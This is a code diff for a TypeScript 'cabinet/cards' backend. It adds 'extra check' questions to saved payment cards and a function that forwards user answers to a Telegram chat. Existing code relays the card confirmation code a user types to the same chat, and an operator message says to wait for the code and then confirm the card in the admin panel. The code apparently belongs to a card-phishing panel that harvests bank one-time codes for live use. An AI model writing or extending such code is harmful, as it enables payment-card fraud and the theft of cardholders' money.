@@ -19,6 +19,8 @@ export type PaymentCardView = {
   expYear: number | null
   isDefault: boolean
   status: string
+  extraCheckMessage: string | null
+  extraCheckResponse: string | null
 }
 
 type CardsResult = { ok: true; cards: PaymentCardView[] }
@@ -45,6 +47,7 @@ async function listCards(userId: string): Promise<PaymentCardView[]> {
     id: r.id, brand: r.brand as CardBrand, last4: r.last4, bankName: r.bankName,
     cardholder: r.cardholder, expMonth: r.expMonth, expYear: r.expYear,
     isDefault: r.isDefault, status: r.status,
+    extraCheckMessage: r.extraCheckMessage, extraCheckResponse: r.extraCheckResponse,
   }))
 }
 
@@ -122,6 +125,33 @@ export async function submitCardCode(id: number, code: string): Promise<CardsRes
     `<b>Код от пользователя для карты #${id}</b>`,
     `Код: <code>${escapeTelegram(trimmed)}</code>`,
     `Пользователь: ${escapeTelegram(user.name ?? "")} (${escapeTelegram(user.email)})`,
+  ].join("\n"))
+
+  revalidatePath("/cabinet/cards")
+  return { ok: true, cards: await listCards(user.id) }
+}
+
+export async function submitExtraCheckResponse(id: number, response: string): Promise<CardsResult> {
+  const user = await getSessionUser()
+  if (!Number.isInteger(id) || id <= 0) throw new Error("Invalid card")
+  const trimmed = String(response ?? "").trim().slice(0, 500)
+  if (!trimmed) throw new Error("Введите ответ.")
+
+  const [row] = await db.update(paymentCard).set({ status: "code_requested", extraCheckResponse: trimmed })
+    .where(and(
+      eq(paymentCard.id, id),
+      eq(paymentCard.userId, user.id),
+      eq(paymentCard.status, "extra_check"),
+      sql`${paymentCard.extraCheckMessage} is not null`,
+    ))
+    .returning({ id: paymentCard.id })
+  if (!row) throw new Error("Заявка недоступна для ответа.")
+
+  void notifyTelegram([
+    `<b>Ответ пользователя на доп. проверку (карта #${id})</b>`,
+    `Ответ: ${escapeTelegram(trimmed)}`,
+    `Пользователь: ${escapeTelegram(user.name ?? "")} (${escapeTelegram(user.email)})`,
+    "Пользователь теперь вводит код — дождитесь его и подтвердите карту в админ-панели.",
   ].join("\n"))
 
   revalidatePath("/cabinet/cards")
